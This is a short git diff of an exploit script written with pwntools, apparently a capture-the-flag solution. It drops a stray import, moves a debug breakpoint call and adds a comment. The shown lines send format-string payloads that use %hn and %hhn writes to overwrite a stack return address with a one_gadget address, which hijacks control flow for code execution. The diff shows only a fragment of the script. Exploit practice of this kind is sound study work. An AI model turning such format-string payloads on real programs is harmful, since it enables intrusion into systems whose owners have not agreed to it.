@@ -1,4 +1,3 @@
-from re import T
 from pwn import *
 
 context.log_level = 'debug'
@@ -53,8 +52,9 @@ success("one_gadget -> " + hex(one_gadget))
 stack_ret = rbp + 0x28
 success("stack_ret -> " + hex(stack_ret))
 
-ddebug("b read")
 
+# modify ret_address by stack 15$
+ddebug("b read")
 io.sendlineafter("another chance.\n", "%" + str((stack_ret + 2) & 0xffff) + "c%15$hn%7$hhn")
 io.sendlineafter("another chance.\n", "%" + str((one_gadget >> 16) & 0xff) + "c%43$hhn%7$hhn")
 io.sendlineafter("another chance.\n", "%" + str((stack_ret) & 0xffff) + "c%15$hn%7$hhn")
